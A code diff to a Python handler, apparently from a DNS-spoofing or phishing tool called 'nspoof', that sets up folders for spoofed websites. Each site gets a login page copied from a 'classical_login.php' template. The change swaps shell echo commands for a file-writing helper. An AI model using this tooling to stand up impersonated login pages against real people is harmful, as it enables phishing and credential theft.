@@ -8,6 +8,15 @@ from environment import *
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'utils')))
 from renew_config_file import renew_config_file
 
+def create_file(directory, filename, content):
+    if not os.path.exists(directory):
+        os.makedirs(directory)
+    
+    full_path = os.path.join(directory, filename)
+    
+    with open(full_path, 'w', encoding='utf-8') as file:
+        file.write(content)
+
 #
 # Handler for adding a website to spoofed websites
 #
@@ -32,7 +41,7 @@ def add_site_command(params):
 	# Recreation of folder
 	try:
 
-		newdir = ENV['webserver_location'] + '/website' + str(idd)
+		newdir = ENV['webserver_location'] + '/nspoof' + str(idd)
 
 		if os.path.exists(newdir):
 			shutil.rmtree(newdir)
@@ -65,16 +74,9 @@ def add_site_command(params):
 
 	subprocess.run(['mv', tmpdir + '/' + params[-2], newdir], check=True)
 
-	chaine_siteid = str(idd)
-	filepath_siteid = newdir + "/site_id.txt"
-	command_siteid = f"echo '{chaine_siteid}' > {filepath_siteid}"
+	create_file(newdir, "site_id.txt", str(idd))
+	create_file(newdir, "domain_name.txt", str(domains[0]))
 
-	chaine_dn = domains[0]
-	filepath_dn = newdir + "/domain_name.txt"
-	command_dn = f"echo '{chaine_dn}' > {filepath_dn}"
-	
-	subprocess.run(command_siteid.split(), shell=True)
-	subprocess.run(command_dn.split(), shell=True)
 	subprocess.run(['cp', ENV['nspoof_location'] + "/login_script_templates/classical_login.php", newdir + "/login.php"])
 
 	new_site = [idd, domains, 0, 1, [], newdir, int(params[-1])]
